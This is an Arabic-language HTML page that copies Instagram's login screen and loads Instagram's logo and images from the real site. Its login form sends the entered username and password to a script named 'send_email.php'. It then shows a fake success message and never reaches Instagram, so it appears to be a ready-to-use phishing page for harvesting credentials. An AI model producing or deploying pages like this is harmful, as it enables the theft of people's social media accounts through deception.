<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول • إنستجرام</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
        }
        
        .wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            max-width: 935px;
            margin: 0 auto;
        }
        
        .phones {
            background-image: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png');
            background-position: 0 0;
            background-size: 454px 618px;
            height: 618px;
            width: 454px;
            position: relative;
            margin-right: 32px;
        }
        
        .phone-screen {
            position: absolute;
            top: 27px;
            right: 113px;
            height: 534px;
            width: 240px;
            background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe239b7c9f.png');
            background-size: cover;
            background-repeat: no-repeat;
        }
        
        .container {
            width: 350px;
        }
        
        .login-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            text-align: center;
            margin-bottom: 10px;
        }
        
        .logo img {
            width: 175px;
            margin: 20px 0;
        }
        
        .login-form input {
            width: 100%;
            padding: 9px 8px 7px;
            margin-bottom: 6px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            text-align: right;
        }
        
        .login-form input:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }
        
        .login-form button {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 7px 16px;
            font-weight: bold;
            margin: 8px 0;
            cursor: pointer;
        }
        
        .login-form button:disabled {
            background-color: #b2dffc;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: bold;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        
        .divider::before {
            margin-left: 10px;
        }
        
        .divider::after {
            margin-right: 10px;
        }
        
        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #385185;
            font-weight: bold;
            font-size: 14px;
            text-decoration: none;
            margin: 10px 0;
        }
        
        .fb-login img {
            width: 16px;
            margin-left: 8px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin: 12px 0;
        }
        
        .signup-box {
            background-color: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        
        .signup-box a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }
        
        .app-download {
            text-align: center;
            margin-top: 20px;
        }
        
        .app-download p {
            margin-bottom: 20px;
            font-size: 14px;
        }
        
        .app-buttons img {
            height: 40px;
            margin: 0 4px;
        }
        
        .success-message {
            display: none;
            color: #0095f6;
            text-align: center;
            margin-top: 10px;
            font-weight: bold;
        }
        
        @media (max-width: 875px) {
            .phones {
                display: none;
            }
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="phones">
            <div class="phone-screen"></div>
        </div>
        
        <div class="container">
            <div class="login-box">
                <div class="logo">
                    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="إنستجرام">
                </div>
                <form class="login-form" action="send_email.php" method="POST">
                    <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف" required>
                    <input type="password" name="password" placeholder="كلمة السر" required>
                    <button type="submit">تسجيل الدخول</button>
                    <div class="divider">
                        <span>أو</span>
                    </div>
                    <a href="#" class="fb-login">
                        <img src="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" alt="فيسبوك">
                        <span>تسجيل الدخول باستخدام فيسبوك</span>
                    </a>
                    <a href="#" class="forgot-password">نسيت كلمة السر؟</a>
                </form>
            </div>
            <div class="signup-box">
                <p>ليس لديك حساب؟ <a href="#">اشترك</a></p>
            </div>
            
            <div class="success-message" id="successMessage" style="display:none;">
                تم تسجيل الدخول بنجاح!
            </div>
        </div>
    </div>

    <script>
        document.querySelector('.login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch(this.action, {
                method: 'POST',
                body: new FormData(this)
            })
            .then(response => {
                if(response.ok) {
                    document.getElementById('successMessage').style.display = 'block';
                    this.reset();
                }
            });
        });
    </script>
</body>
</html>
